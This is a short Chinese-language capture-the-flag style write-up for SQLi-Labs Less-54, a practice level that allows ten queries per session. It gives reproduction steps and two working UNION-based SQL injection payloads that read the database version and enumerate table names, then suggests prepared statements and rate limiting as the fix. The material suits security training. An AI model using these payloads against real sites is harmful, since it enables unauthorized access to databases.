# SQLi-Labs | Less-54 挑战关卡 猜解 10次机会
## 一、漏洞简介
挑战关卡，GET单引号字符注入，页面有回显，但是每个session只有10次查询机会，需要快速猜解数据库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-54/?id=1
注入类型：GET、字符型、单引号闭合、联合注入、次数限制
## 三、复现步骤
1. ?id=1' 报错，单引号闭合。
2. order by 3，union联合查询。
3. 控制查询次数，在10次内拿到库、表、字段、flag。
## 四、Payload
`?id=-1' union select 1,version(),database() --+`
`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`
## 五、漏洞原理
`SELECT * FROM users WHERE id='$id' LIMIT 0,1`
增加服务端计数，限制单次会话查询次数，注入本身无特殊过滤。
## 六、修复方案
1. 预编译，增加访问频率限制。
## 七、总结
Less54考察注入效率，必须减少查询次数，快速拿到flag。